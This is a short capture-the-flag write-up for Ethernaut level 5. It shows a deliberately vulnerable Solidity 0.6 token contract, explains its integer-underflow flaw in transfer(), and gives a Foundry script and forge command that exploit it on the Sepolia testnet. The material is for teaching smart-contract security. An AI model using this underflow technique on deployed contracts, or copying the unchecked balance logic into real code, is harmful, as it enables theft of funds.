# Ethernaut Level 5

---

Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```

We notice that this contract is using a very old version of solidity, which does not introduce protection to numeric underflow/overflow. Since we have a balance of 20 tokens at the beginning, we can just transfer 21 token to any other account, we will break `equire(balances[msg.sender] - _value >= 0)` and have a very large amount of balance because of the underflow.

`Token.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import {Token} from "../src/Token.sol";

contract TokenScript is Script {
    Token token = Token(0xXXXXXXXXXXXXXX);
    function run() external {
        vm.startBroadcast();
        token.transfer(address(0), 21);
        vm.stopBroadcast();
    }
}
```

Then we can run the command:

```bash
forge script script/Token.s.sol:TokenScript --rpc-url $SEPOLIA_RPC_URL$ --account default --broadcast
```

